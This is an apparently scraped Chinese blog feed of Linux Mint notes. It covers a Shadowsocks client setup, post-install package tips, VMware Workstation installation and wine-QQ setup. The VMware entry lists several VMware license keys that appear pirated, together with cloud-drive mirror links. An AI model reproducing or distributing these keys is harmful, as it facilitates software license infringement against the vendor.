    &lt;pre&gt;</code>sudo apt-get remove notepadqq<br>    sudo add-apt-repository –remove ppa:notepadqq-team/notepadqq<br><br></div></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux mint这个成功了shadowscoke客户端配置]]></title>
      <url>http://www.linux52.com/2015-03-06-linux-mint-e8-bf-99-e4-b8-aa-e6-88-90-e5-8a-9f-e4-ba-86shadowscoke-e5-ae-a2-e6-88-b7-e7-ab-af-e9-85-8d-e7-bd-ae.html</url>
      <content type="html"><![CDATA[<p>查了很多都是各种坑爹的安装服务端但是没有客服端 所以这里自己做个笔记</p>
<p>客户端配置</p>
<ul>
<li>客户端支持Linux、Windows等，具体见</li>
</ul>
<h1 id="这里"><a href="#这里" class="headerlink" title="这里"></a><span style="color: #ff0000;"><em><strong><a href="http://shadowsocks.cn/clients.html" target="_blank" rel="external">这里</a></strong></em></span></h1><p>这里是所有版本的另外一个下载地址</p>
<ul>
<li><a href="http://sourceforge.net/projects/shadowsocksgui/files/dist/" target="_blank" rel="external">http://sourceforge.net/projects/shadowsocksgui/files/dist/</a><br>下面以Linux为例。<br><div><br><div></div><br><pre class="prettyprint perl">wget dl.chenyufei.info/shadowsocks/shadowsocks-local-linux64-1.1.3.gz //64位系统<br><a href="http://dl.chenyufei.info/shadowsocks/shadowsocks-local-linux32-1.1.3.gz" target="_blank" rel="external">http://dl.chenyufei.info/shadowsocks/shadowsocks-local-linux32-1.1.3.gz</a> //32位系统<br>gunzip shadowsocks-local-linux64-1.1.3.gz<br>chmod a+x shadowsocks-local-linux64-1.1.3</pre><br></div><br><a href="http://dg2016.duapp.com/wp-content/uploads/2015/03/shadowsocks-local-linux64-1.1.3.gz" target="_blank" rel="external">shadowsocks-local-linux64-1.1.3</a>     <a href="http://dg2016.duapp.com/wp-content/uploads/2015/03/shadowsocks-local-linux32-1.1.3.gz" target="_blank" rel="external">shadowsocks-local-linux32-1.1.3</a></li>
</ul>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/03/Shadowsocks-win-2.3.1.zip" target="_blank" rel="external">Shadowsocks-win-2.3.1</a></p>
<p>然后运行客户端，配置要与服务器端设置的一致：</p>
<p><div></div></p>
<p><div></div></p>
<p><pre class="prettyprint bash">./shadowsocks-local-linux64-1.1.3 -d=true -k=”服务器的密码” -m=”aes-256-cfb” -l=8700 -p=服务器的端口 -s=”服务器的ip”</pre><br><br>如果运行成功会有提示，最后就是设置本地浏览器的代理就可以了。</p>
<p>PS：如果觉得client命令太长，也可以用 alias。</p>
<h1 id="Linux-shell命令的实际应用——alias增加自定义命令"><a href="#Linux-shell命令的实际应用——alias增加自定义命令" class="headerlink" title="Linux/shell命令的实际应用——alias增加自定义命令"></a>Linux/shell命令的实际应用——alias增加自定义命令</h1><p>我们可以通过修改/etc/bash.bashrc文件（其他用户在各自目录中），使得我们登陆shell时自动加载我们自定义的命令。</p>
<p>例如：</p>
<p>我的代码目录是/home/ln/code/test/，我想每次在任何路径下输入mycode便可切换到该路径。</p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/03/120616072070141.jpg" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/03/120616072070141-300x172.jpg" alt="120616072070141"></a></p>
<p>图中我在bash.bashrc中添加了 alias mycode=’cd /home/ln/code/test’，重新登陆shell，在任意位置只要输入mycode即可定位。</p>
<p>再比如我经常需要抓包，命令行如下：</p>
<p>抓IP为192.168.91.128  port 22、80、8048以外的数据包</p>
<p>tcpdump -i any host 192.168.1.123 and ! port 22 and ! port 80 and ! port 8048 -w /opt/temp.cap</p>
<p>可以将上面的命令也使用alias增加到文件中……节省时间提高效率必备</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[安装Linux Mint 17后要做的]]></title>
      <url>http://www.linux52.com/2015-03-06-e5-ae-89-e8-a3-85linux-mint-17-e5-90-8e-e8-a6-81-e5-81-9a-e7-9a-84.html</url>
      <content type="html"><![CDATA[<h3 id="1-更新系统"><a href="#1-更新系统" class="headerlink" title="1. 更新系统"></a>1. 更新系统</h3><p>第一件事情是重中之重，就是让你的系统保持时刻最新。赶紧在终端中运行以下命令吧。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> update</span></li>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> upgrade</span><br>或者，你也可以使用更新管理器（mintUpdate）来干这事，你可以在菜单（Menu）&gt; 管理（Administration）中找到它。</li>
</ol>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2015/03/120250lmu3vc55mr5uv5v3.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/03/120250lmu3vc55mr5uv5v3-300x169.png" alt="120250lmu3vc55mr5uv5v3"></a></p>
<h3 id="2-找回旧壁纸"><a href="#2-找回旧壁纸" class="headerlink" title="2. 找回旧壁纸"></a>2. 找回旧壁纸</h3><p>每个Linux Mint发行版都自带了一套最新的漂亮的壁纸。但是，你也可以安装先前版本中的壁纸。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install mint</span><span class="pun">-</span><span class="pln">backgrounds</span><span class="pun">-*</span></li>
</ol>
<p>### </p>
<h3 id="3-多安装些浏览器"><a href="#3-多安装些浏览器" class="headerlink" title="3. 多安装些浏览器"></a>3. 多安装些浏览器</h3><p>Linux Mint 17默认安装了firefox，你也可以获得更多的浏览器，如Chronium和Google Chrome。</p>
<p>Chronium浏览器可以在仓库中获取。</p>
<ol>
<li><p><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install chromium</span><span class="pun">-</span><span class="pln">browser</span><br>至于Google Chrome，请访问google.com/chrome下载deb包，并使用gdebi来安装。</p>
</li>
<li><p><span class="com"># 64 位</span></p>
</li>
<li><span class="pln">$ wget https</span><span class="pun">:</span><span class="com">//dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span></li>
<li><span class="pln">$ sudo gdebi google</span><span class="pun">-</span><span class="pln">chrome</span><span class="pun">-</span><span class="pln">stable_current_amd64</span><span class="pun">.</span><span class="pln">deb</span></li>
<li><span class="pln"> </span></li>
<li><span class="com"># 32 位</span></li>
<li><span class="pln">$ wget https</span><span class="pun">:</span><span class="com">//dl.google.com/linux/direct/google-chrome-stable_current_i386.deb</span></li>
<li><span class="pln">$ sudo gdebi google</span><span class="pun">-</span><span class="pln">chrome</span><span class="pun">-</span><span class="pln">stable_current_i386</span><span class="pun">.</span><span class="pln">deb</span><br>&nbsp;</li>
</ol>
<h3 id="4-安装Flash-Player"><a href="#4-安装Flash-Player" class="headerlink" title="4. 安装Flash Player"></a>4. 安装Flash Player</h3><p>Mint上默认安装adobe flash插件包（adobe-flashplugin），因此，你可以在Firefox中畅玩flash游戏，也可以尽情享受网页版视频了。</p>
<p>Google Chrome现在使用了基于flash player的Pepper API，而且该插件也内建于Chrome中，因此，你也不需要为它额外做任何事情了。</p>
<p>然而对于Chronium，基于flash player的Pepper没有被囊括进来（因为它不是个自由组件），所以你需要手动安装了。</p>
<p>安装以下包来为Chronium安装pepper flash player。它会自动从Google Chrome浏览器中下载pepper flash player并加入到Chronium中。</p>
<ol>
<li><p><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install pepperflashplugin</span><span class="pun">-</span><span class="pln">nonfree</span><br>上面的命令应该帮你将flash player安装到Chronium里头了。万一下载失败，你可以使用下面的命令重新进行安装。</p>
</li>
<li><p><span class="pln">$ sudo dpkg</span><span class="pun">-</span><span class="pln">reconfigure pepperflashplugin</span><span class="pun">-</span><span class="pln">nonfree</span></p>
</li>
</ol>
<p>### </p>
<h3 id="5-安装多媒体解码"><a href="#5-安装多媒体解码" class="headerlink" title="5. 安装多媒体解码"></a>5. 安装多媒体解码</h3><p>受限的额外包可以帮你安装大多数基本的解码，可以让你播放像mp3这样的格式。它也会帮你安装微软字体。</p>
<ol>
<li><p><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install ubuntu</span><span class="pun">-</span><span class="pln">restricted</span><span class="pun">-</span><span class="pln">extras</span><br>要启用加密dvd的回放，请安装以下包。</p>
</li>
<li><p><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install libdvdread4</span></p>
</li>
<li><span class="pln">$ sudo </span><span class="pun">/</span><span class="pln">usr</span><span class="pun">/</span><span class="pln">share</span><span class="pun">/</span><span class="pln">doc</span><span class="pun">/</span><span class="pln">libdvdread4</span><span class="pun">/</span><span class="pln">install</span><span class="pun">-</span><span class="pln">css</span><span class="pun">.</span><span class="pln">sh</span></li>
</ol>
<p>### </p>
<h3 id="6-安装专有驱动"><a href="#6-安装专有驱动" class="headerlink" title="6. 安装专有驱动"></a>6. 安装专有驱动</h3><p>如果你有一张Nvidia或者ati的图形卡，或者broadcom的无线网卡，那么请安装厂商提供的专有驱动，这些驱动会为你带来最佳的硬件性能。</p>
<p>要安装Nvidia驱动，你可以参照先前的这篇文章 ：<a href="http://www.binarytides.com/install-nvidia-drivers-linux-mint-16/" target="_blank" rel="external">如何在Linux Mint上安装最新的Nvidia驱动</a></p>
<p>### </p>
<h3 id="7-安装Dropbox"><a href="#7-安装Dropbox" class="headerlink" title="7. 安装Dropbox"></a>7. 安装Dropbox</h3><p>Linux mint仓库已经提供了dropbox的客户端软件包，所以你不必满世界找了。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install dropbox python</span><span class="pun">-</span><span class="pln">gpgme</span><br>如果你还是比较喜欢从官方网站下载，那么翻墙可直达<a href="http://www.dropbox.com/install?os=lnx" target="_blank" rel="external">https://www.dropbox.com/install?os=lnx</a>，请遵照说明下载用于Ubuntu的deb安装包。（LCTT译注：墙内用户还是忽视此条吧。）</li>
</ol>
<p>Copy是另外一个云存储解决方案，它也有本地Linux客户端。详情可查阅<a href="http://copy.com/?r=DSwtSd" target="_blank" rel="external">copy.com</a>，它也有<a href="http://launchpad.net/~paolorotolo/+archive/copy" target="_blank" rel="external">ppa仓库</a>。</p>
<p>### </p>
<h3 id="8-Skype"><a href="#8-Skype" class="headerlink" title="8. Skype"></a>8. Skype</h3><p>Skype可以在Ubuntu canonical合作仓库中找到。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install skype</span></li>
</ol>
<p>### </p>
<h3 id="9-安装rar和其它归档工具"><a href="#9-安装rar和其它归档工具" class="headerlink" title="9. 安装rar和其它归档工具"></a>9. 安装rar和其它归档工具</h3><p>要想在Nemo这样的文件管理器中通过上下文菜单创建rar归档，请安装rar工具。安装rar的同时，也可安装其它几个包以增加对其它归档格式的支持。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install unace p7zip</span><span class="pun">-</span><span class="pln">rar sharutils rar arj lunzip lzip</span></li>
</ol>
<p>### </p>
<h3 id="10-安装剪贴板管理器"><a href="#10-安装剪贴板管理器" class="headerlink" title="10. 安装剪贴板管理器"></a>10. 安装剪贴板管理器</h3><p>剪贴板管理器允许你维护和访问通过像Ctr+C这样的操作拷贝的项目历史，gnome下有很多的剪贴板管理器，像diodon，clipit，glipper，parcellite。</p>
<p>Diodon在cinnamon桌面上似乎存在一些问题，在历史列表增长时会出现滚动条。Clipit和Gipper工作得很好，你也可以安装</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install glipper</span></li>
<li><span class="com"># 或者</span></li>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install clipit</span><br>然后，你可以从应用程序菜单中启动它们，它们应该会在你每次登录时启动。</li>
</ol>
<p>&nbsp;</p>
<h3 id="11-优化桌面"><a href="#11-优化桌面" class="headerlink" title="11. 优化桌面"></a>11. 优化桌面</h3><h4 id="1-修复系统托盘上的日期格式"><a href="#1-修复系统托盘上的日期格式" class="headerlink" title="1. 修复系统托盘上的日期格式"></a>1. 修复系统托盘上的日期格式</h4><p>在底部面板右边的时间小程序只显示了时间，它也可以设置显示日期。右击底部面板右边的日期-时间小程序，然后点击配置，选中标有“使用自定义日期格式”的选框，然后填入</p>
<ol>
<li><span class="pun">%</span><span class="pln">B </span><span class="pun">%</span><span class="pln">e</span><span class="pun">,</span> <span class="pun">%</span><span class="pln">I</span><span class="pun">:%</span><span class="pln">M </span><span class="pun">%</span><span class="pln">p</span><br>这会以带有AM/PM的12小时格式显示月份名称、日期和时间。</li>
</ol>
<p>#### </p>
<h4 id="2-安装主题、扩展、小程序、桌面组件"><a href="#2-安装主题、扩展、小程序、桌面组件" class="headerlink" title="2. 安装主题、扩展、小程序、桌面组件"></a>2. 安装主题、扩展、小程序、桌面组件</h4><p>为你的桌面搞一些好东西玩玩。你可以在桌面区域放置一些桌面组件，在面板上放些小程序，为桌面效果添加一些扩展，以及为桌面设计安装一些主题。</p>
<p>去系统设置吧，点击指定的图标，你可以看见一个可供选择的列表。点击“在线获取更多”标签来下载更多的好东西。</p>
<p>#### </p>
<h4 id="3-修改Firefox的搜索引擎"><a href="#3-修改Firefox的搜索引擎" class="headerlink" title="3. 修改Firefox的搜索引擎"></a>3. 修改Firefox的搜索引擎</h4><p>你也许注意到，Firefox默认选择了Yahoo搜索引擎，而搜索引擎列表中并没有Google。点击“管理搜索引擎” &gt; 获取更多搜索引擎，它会带你去 <a href="http://www.linuxmint.com/searchengines.php" target="_blank" rel="external">http://www.linuxmint.com/searchengines.php</a>。</p>
<p>向下拉动滚动条到商业搜索引擎部分，找到并点击Google图标。进入下一页后，再次点击搜索引擎列表，而这次你会看到“添加Google”选项，点击它就可以用上Google搜索了。（LCTT译注：墙内用户也请忽略此条。怒！）</p>
<p>&nbsp;</p>
<h3 id="12-优化字体渲染"><a href="#12-优化字体渲染" class="headerlink" title="12. 优化字体渲染"></a>12. 优化字体渲染</h3><p>Linux mint默认使用Dejavu Sans字体，它看起来真普通啊。你可以使用Droid和Noto字体获得好看得多视觉享受。请参照我们先前的教程，它会一步一步带你渐入佳境。<a href="http://www.binarytides.com/optimize-fonts-linux-mint/" target="_blank" rel="external">如何在Linux Mint上获得华丽好看的字体</a></p>
<p>### </p>
<h3 id="13-Guake下拉终端"><a href="#13-Guake下拉终端" class="headerlink" title="13. Guake下拉终端"></a>13. Guake下拉终端</h3><p>下拉终端让你可以通过点击单个键来访问终端，Guake就是这其中之一，它用于基于gtk的桌面。下拉终端按要求显示/隐藏，并保持运行，因此你无需从菜单或者启动器中打开终端了。这对于热衷于终端的人来说，这是一个必不可少的工具。</p>
<ol>
<li><p><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install guake</span><br>Guake需要配置，以便在每次登陆时启动。首先，找到guake命令的路径。</p>
</li>
<li><p><span class="pln">$ which guake</span></p>
</li>
<li><span class="pun">/</span><span class="pln">usr</span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">guake</span><br>现在，把它添加到启动程序列表中。出门左拐，请往系统设置 &gt; 启动程序，然后点击添加。在对话框中填写<blockquote>
<p>名称 - Guake下拉终端 命令 - /usr/bin/guake<br>点击添加。现在Guake已经跑到你的运行程序列表中去了，并每次会自动启动。</p>
</blockquote>
</li>
</ol>
<p>### </p>
<h3 id="14-Uget下载管理器"><a href="#14-Uget下载管理器" class="headerlink" title="14. Uget下载管理器"></a>14. Uget下载管理器</h3><p>Uget是一个简洁而健壮的跨平台下载管理器，在Linux上工作得很好。虽然它缺少分段下载文件功能，但是仍然是一个十分稳定的下载管理器。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install uget</span></li>
</ol>
<p>### </p>
<h3 id="15-Deluge-BitTorrent客户端"><a href="#15-Deluge-BitTorrent客户端" class="headerlink" title="15. Deluge BitTorrent客户端"></a>15. Deluge BitTorrent客户端</h3><p>Linux Mint自带了Transmission，这是个简洁而高效的torrent客户端。如果正在寻找一个更有特色的torrent客户端，那么你可以试试deluge或者vuze（正式名称是azureus），还可以试试qbittorent。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install deluge</span><span class="pun">-</span><span class="pln">torrent</span></li>
</ol>
<p>### </p>
<h3 id="16-Hardinfo-系统信息工具"><a href="#16-Hardinfo-系统信息工具" class="headerlink" title="16. Hardinfo - 系统信息工具"></a>16. Hardinfo - 系统信息工具</h3><p>Hardinfo是一个十分便利的GUI工具，它可以用来报告大量完整的系统硬件信息。你可以通过它来集中查看处理器、内存、存储设备、网络配置、打印机、usb设备、声音/视频适配器等等信息。它具有测试和评估系统性能的功能。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install hardinfo</span></li>
</ol>
<p>### </p>
<h3 id="17-安装MATE桌面环境"><a href="#17-安装MATE桌面环境" class="headerlink" title="17. 安装MATE桌面环境"></a>17. 安装MATE桌面环境</h3><p>除了Cinnamon，Linux Mint还自带了另一个流行的桌面环境MATE（Maatay）桌面。如果你想试试，那么就来安装吧。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install mint</span><span class="pun">-</span><span class="pln">meta</span><span class="pun">-</span><span class="pln">mate</span><br>现在你可以在登陆屏幕选择MATE会话了。</li>
</ol>
<p>### </p>
<h3 id="18-让其它分区可写"><a href="#18-让其它分区可写" class="headerlink" title="18. 让其它分区可写"></a>18. 让其它分区可写</h3><p>如果你有其它ext分区，比如想用来存储和备份文件，那么你需要让它们可写，以免每次都要使用root特权。</p>
<p>首先，使用gksudo在文件管理器里打开分区挂载目录</p>
<ol>
<li><span class="pln">$ gksudo nemo</span><br>导航到分区目录，右击去往属性 &gt; 权限标签</li>
</ol>
<p>赋予“目录访问” - 创建和删除文件权限给用户、组和其它。</p>
<p>赋予“文件访问” - 读和写权限给用户、组和其它。</p>
<p>对于NTFS分区，你不需要做此事。</p>
<p>### </p>
<h3 id="19-安装Conky"><a href="#19-安装Conky" class="headerlink" title="19. 安装Conky"></a>19. 安装Conky</h3><p>Conky是一个轻量级系统监控工具，它通过桌面图形组件显示系统各种资源的统计数据，如cpu、内存、网络等。它不是必须的，但是可以让你的桌面更加绚丽夺目。</p>
<ol>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="pln">add</span><span class="pun">-</span><span class="pln">repository </span><span class="pun">-</span><span class="pln">y ppa</span><span class="pun">:</span><span class="pln">teejee2008</span><span class="pun">/</span><span class="pln">ppa</span></li>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> update</span></li>
<li><span class="pln">$ sudo apt</span><span class="pun">-</span><span class="kwd">get</span><span class="pln"> install conky</span><span class="pun">-</span><span class="pln">manager</span><br>从应用程序菜单启动Conky管理器，并添加组件到桌面。也可以选中开机启动选项来让Conky开机启动。</li>
</ol>
<p>### </p>
<h3 id="20-安装一些游戏"><a href="#20-安装一些游戏" class="headerlink" title="20. 安装一些游戏"></a>20. 安装一些游戏</h3><p>Linux确实有一些酷爽的游戏，很具娱乐性，而且是免费的。注意，某些游戏像supertuxkart和0ad要求专用的图形处理器以优化性能。</p>
<ol>
<li><span class="com"># 0ad - 像帝国时代那样的策略游戏</span></li>
<li><span class="pln">$ aptitude search </span><span class="lit">0ad</span></li>
<li><span class="pln"> </span></li>
<li><span class="com"># supertuxkart - 赛车游戏</span></li>
<li><span class="pln">$ aptitude search supertuxkart</span></li>
<li><span class="pln"> </span></li>
<li><span class="com"># openarena</span></li>
<li><span class="pln">$ aptitude search openarena</span><br>仓库中还有更多的游戏可供你安装，像Alien arena, secret maryo chronicles, supertux, frozen bubbles等等。</li>
</ol>
<h4 id="更多应用程序"><a href="#更多应用程序" class="headerlink" title="更多应用程序"></a>更多应用程序</h4><p>如果你正在为你的Mint盒子寻找更多的应用程序，那么这里列出了一部分更好的应用程序，所有这些都可以在软件管理器中安装。</p>
<ul>
<li>Opera - 网页浏览器</li>
<li>Gnome Encfs Manager - 管理使用Encfs加密的文件和文件夹</li>
<li>Smplayer - 多媒体播放器</li>
<li>Rhythmbox, Clementine - 音乐播放器</li>
<li>Openshot, Kdenlive - 视频编辑器</li>
<li>Audacity - 音频编辑器</li>
<li>Inkscape - 图形和图像编辑</li>
<li>Gparted - 分区编辑器</li>
<li>Gufw - 防火墙配置工具</li>
<li>qBittorrent, Vuze - Torrent客户端</li>
<li>Gwenview - 图像浏览</li>
<li>Team viewer - 远程桌面</li>
<li>Tv-maxe - 查看电视频道</li>
<li>Grub Customizer - 修改GRUB启动菜单设置</li>
<li>Linrunner TLP - 电源管理工具，对笔记本节电很有用</li>
<li>Virtualbox - 虚拟化</li>
<li>Kazam, recordMyDesktop - 桌面录像/演示</li>
<li>Bleachbit - 通过删除旧的/临时文件释放磁盘空间</li>
<li>Cheese - 使用网络摄像头拍照</li>
<li>Shutter - 带有众多功能的屏幕截图工具<br>那么，请选择你喜欢的那些，并尽情享受Linux Mint吧！！</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ubuntu 14.x vmware 安装]]></title>
      <url>http://www.linux52.com/2015-03-06-ubuntu-14-x-vmware-e5-ae-89-e8-a3-85.html</url>
      <content type="html"><![CDATA[<p>sudo apt-get install libcanberra-gtk3-module</p>
<p>在Debian Unstable上安装VMware Workstation 10，因为当前版本的VMware对3.13版本的内核的支持不足，颇费了一番周折。这次在Ubuntu 14.04 LTS上安装，倒是无意中查到VMware Workstation 10.0.2已经支持3.13版本的内核，安装非常顺利。</p>
<p>安装也很简单，下载安装文件后添加执行权限，然后运行</p>
<blockquote>
<p>sudo ./VMware-Workstation-Full-10.0.2-1744117.x86_64.bundle<br>进行安装。</p>
</blockquote>
<p>可能会出现以下错误信息：</p>
<blockquote>
<p>(vmware-installer.py:3292): Gtk-WARNING **: 无法在模块路径中找到主题引擎：“murrine”，</p>
<p>Gtk-Message: Failed to load module “canberra-gtk-module”: libcanberra-gtk-module.so: 无法打开共享对象文件: 没有那个文件或目录<br>这只是缺少了Murrine 这个漂亮的 GTK2 主题引擎，并不影响VMware Workstation 10.0.2的安装，按向导提示，仍可以安装并使用VMware Workstation。</p>
<p><table cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td id="postmessage_40069540" class="t_f"><span style="color: #0066cc;">VMware Workstation for Linux 32 位</span> 下载地址：<br><span style="color: #0066cc;"><a href="https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.2-1744117.i386.bundle" target="_blank" rel="external">https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.2-1744117.i386.bundle</a></span><span style="color: #0066cc;">VMware Workstation for Linux 64 位</span>下载地址：<br><span style="color: #0066cc;"><a href="https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.2-1744117.x86_64.bundle" target="_blank" rel="external">https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-10.0.2-1744117.x86_64.bundle</a></span>网盘下载</td></p>
</blockquote>
<p><a href="http://yunpan.cn/cJ4BhpiipsbTc" target="_blank" rel="external">http://yunpan.cn/cJ4BhpiipsbTc</a> （提取码：cb21）64</p>
<p><a href="http://yunpan.cn/cJ46gjwQPZnbd" target="_blank" rel="external">http://yunpan.cn/cJ46gjwQPZnbd</a> （提取码：f98c）32</p>
<p>&nbsp;</p>
<p><a href="https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-11.0.0-2305329.x86_64.bundle" target="_blank" rel="external">https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-11.0.0-2305329.x86_64.bundle</a><br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-11.0.0-2305329.exe" target="_blank" rel="external">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-11.0.0-2305329.exe</a><br>1F04Z-6D111-7Z029-AV0Q4-3AEH8<br><br><br><br>key</p>
<p>0Y627-8A39K-RZGF9-6UA7K-13VP6<br>NG275-F3J13-AZUZ0-V9AXP-9A9JH<br>HA2GV-D0386-KZ318-C1A76-9C8NF<br>1V6L1-FNJ1M-5ZG90-K80E6-A38M8<br>1Y450-8HH1Q-8ZDN0-UR17M-A2KJT</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>10版本的</p>
<p>我安装10版本的不行出错</p>
<p>11版本的还算可以</p>
<p>输入命令：#vmware-installer -l <wbr> <wbr> 查看已经安装的虚拟机<br><span style="color: #ff0000;">Product Name <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> Product Version <wbr> <wbr> <wbr> <wbr><br>==================== ====================<br>vmware-workstation <wbr> <wbr> 9.0.0.812388 <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr><br>vmware-wsx <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> 1.0.1.842025</span> <wbr> <wbr><br>然后再输入命令来卸载：vmware-installer -u vmware-workstation</p>
<p><wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> <wbr> vmware-installer -u vmware-wsx</p>
<p><a href="http://blog.csdn.net/allenlinrui/article/details/7269980" target="_blank" rel="external">Linux下卸载vmware</a></p>
<p><strong>1.先查看安装的虚拟机</strong></p>
<p><strong>vmware-installer -l</strong></p>
<p>然后会显示版本和产品名称<br>Product Name           Product Version<br>====================== ====================<br>vmware-workstation     7.0.1.227600</p>
<p><strong>2.卸载虚拟机</strong></p>
<p><strong>sudo vmware-installer –uninstall-product vmware-workstation</strong><br>然后根据提示点两下就ok了。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux mint 各种安装]]></title>
      <url>http://www.linux52.com/2015-03-06-linux-mint-e5-90-84-e7-a7-8d-e5-ae-89-e8-a3-85.html</url>
      <content type="html"><![CDATA[<p>输入法</p>
<p>sudo apt-get install fcitx fcitx-table-wubi-large fcitx-frontend-all fcitx-frontend-gtk2 fcitx-frontend-gtk3 fcitx-frontend-qt4 fcitx-config-gtk fcitx-ui-classic fcitx-module-kimpanel fcitx-module-dbus libopencc1 fcitx-libs-qt</p>
<p>sudo apt-get install fcitx<br>sudo apt-get install fcitx-table-wbpy<br>sudo apt-get install im-switch<br>im-switch -s fcitx</p>
<p><a href="http://www.bubuko.com/so/1/wineqq%E5%9B%BD%E9%99%85%E7%89%88" title="wineqq国际版" target="_blank" rel="external">wineqq国际版</a></p>
<p>国际版有以下好处：</p>
<p>1:支持密码<span id="3_nwp"><a href="http://cpro.baidu.com/cpro/ui/uijs.php?c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=16&amp;jk=d36e705a2a75e265&amp;k=%BC%FC%C5%CC&amp;k0=%BC%FC%C5%CC&amp;kdi0=0&amp;luki=3&amp;n=10&amp;p=baidu&amp;q=65035100_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=65e2752a5a706ed3&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;tu=u1836545&amp;u=http%3A%2F%2Fwww%2Ebubuko%2Ecom%2Finfodetail%2D343048%2Ehtml&amp;urlid=0" target="_blank" rel="external">键盘</a></span>输入并记住密码。</p>
<p>2:可以发送QQ表情无问题。</p>
<p>3:传送文件无问题。</p>
<p>4.IBus输入法正常。</p>
<p>5:QQ设置常用功能，比较精简，且占用CPU少。</p>
<p>在终端输入sudo apt-get install  libgtk2.0-0:i386</p>
<p>但是Ubuntu14.04中该<span id="2_nwp"><a href="http://cpro.baidu.com/cpro/ui/uijs.php?c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=16&amp;jk=d36e705a2a75e265&amp;k=%C8%ED%BC%FE%B0%FC&amp;k0=%C8%ED%BC%FE%B0%FC&amp;kdi0=0&amp;luki=2&amp;n=10&amp;p=baidu&amp;q=65035100_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=65e2752a5a706ed3&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;tu=u1836545&amp;u=http%3A%2F%2Fwww%2Ebubuko%2Ecom%2Finfodetail%2D343048%2Ehtml&amp;urlid=0" target="_blank" rel="external">软件包</a></span>已经被其他版本替代，</p>
<p>所以这里我们选择安装lib32ncurses5,</p>
<p>因此在终端输入sudo apt-get install lib32ncurses5</p>
<p>但是我在安装中发生了错误，原因是还有lib没有配置，所以再输入</p>
<p><strong>               sudo apt-get install -f</strong></p>
<p>然后再重新输入sudo dpkg -i wine-qqintl_0.1.3-2_i386.deb,然后便会发现安装正常了。</p>
<p>之后再继续输入sudo dpkg -i ttf-wqy-microhei_0.2.0-beta-2_all.deb 和</p>
<p>sudo dpkg -i fonts-wqy-microhei_0.2.0-beta-2_all.deb将剩余的两个deb包安装。</p>
<p>wineqqIntl默认安装路径为/usr/share/applications/ 当中</p>
<p>下载包</p>
<p><a href="http://yunpan.cn/cJ4RIrNbfPiGe" target="_blank" rel="external">http://yunpan.cn/cJ4RIrNbfPiGe</a> （提取码：29d4）</p>
<p>&nbsp;</p>
<p>旺旺</p>
<p><a href="http://yunpan.cn/cJ4RhhUypE8aE" target="_blank" rel="external">http://yunpan.cn/cJ4RhhUypE8aE</a> （提取码：6f13）</p>
<p>==================================================================================================================================</p>
<p>vi方向乱码</p>
<p>$ sudo apt-get remove vim-common</p>
<p>再安装vim full：</p>
